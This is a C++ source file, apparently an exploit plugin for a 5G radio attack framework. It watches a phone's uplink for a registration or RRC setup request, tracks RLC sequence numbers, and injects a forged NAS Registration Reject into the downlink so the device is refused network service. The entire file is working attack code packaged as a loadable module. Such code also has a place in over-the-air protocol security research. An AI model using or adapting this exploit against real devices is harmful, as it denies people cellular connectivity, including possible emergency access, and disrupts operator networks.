#include "shadower/modules/exploit.h"
#include "shadower/utils/constants.h"
#include "shadower/utils/utils.h"

const uint8_t registration_reject[] = {
    0x01, 0x03, 0x00, 0x02,
    0x00, // ACK SN = 2
    0x41, 0x00, 0x0f, 0xc0, 0x00, 0x00, 0x00, 0x2c, 0x80, 0x8f, 0xc0, 0x08,
    0x83, 0x60, 0x00, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00}; // Registration Reject

class RegistrationRejectExploit : public Exploit
{
public:
  RegistrationRejectExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                            SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    reg_reject.reset(new std::vector<uint8_t>(registration_reject, registration_reject + sizeof(registration_reject)));
  }

  void setup() override
  {
    f_registration_request = ws_filter_t::make_filter("nas-5gs.mm.message_type == 0x41");
    filters.push_back(f_registration_request);
    f_rrc_setup_request = ws_filter_t::make_filter("nr-rrc.c1 == 0");
    filters.push_back(f_rrc_setup_request);

    f_ack_sn = ws_field_t::make_field_uint32("rlc-nr.am.ack-sn");
    fields.push_back(f_ack_sn);
    f_sn = ws_field_t::make_field_uint32("rlc-nr.am.sn");
    fields.push_back(f_sn);
    f_nack = ws_field_t::make_field_uint32("rlc-nr.am.nack-sn");
    fields.push_back(f_nack);
  }

  void pre_dissection() override {}

  void post_dissection(uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL) {
      // If ACK SN from UE received, then update the sequence number to new sequence number
      if (f_ack_sn->has_uint32) {
        uint32_t ack_sn_recv = f_ack_sn->uint32_value;
        logger.info("Received ACK SN: %u", ack_sn_recv);
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
        }
      }

      if (f_sn->has_uint32) {
        uint32_t sn_recv = f_sn->uint32_value;
        logger.info("Received msg with SN: %u", sn_recv);
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv;
        }
      }

      if (f_nack->has_uint32) {
        uint32_t nack_recv = f_nack->uint32_value;
        logger.info("Received NACK SN: %u", nack_recv);
        if (nack_recv > dl_sn) {
          dl_sn = nack_recv;
        }
        send_registration_reject();
        return;
      }

      if (f_rrc_setup_request->match) {
        logger.info("Received RRC Setup Request");
        dl_sn     = 0;
        dl_ack_sn = 1;
      }

      // If registration request detected, send out registration reject message
      if (f_registration_request->match) {
        logger.info("\033[0;31mRegistration request detected\033[0m");
        send_registration_reject();
        return;
      }
    }
  }

private:
  // Send out registration reject message
  void send_registration_reject()
  {
    reg_reject->data()[3]  = dl_ack_sn & 0xff;
    reg_reject->data()[9]  = dl_sn & 0xff;
    reg_reject->data()[11] = dl_sn & 0xff;
    dl_buffer_queue.push(reg_reject);
  }

  std::shared_ptr<ws_filter_t> f_registration_request;
  std::shared_ptr<ws_filter_t> f_rrc_setup_request;
  std::shared_ptr<ws_field_t>  f_ack_sn;
  std::shared_ptr<ws_field_t>  f_sn;
  std::shared_ptr<ws_field_t>  f_nack;

  uint32_t dl_sn     = 0;
  uint32_t dl_ack_sn = 1;

  std::shared_ptr<std::vector<uint8_t> > reg_reject;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new RegistrationRejectExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}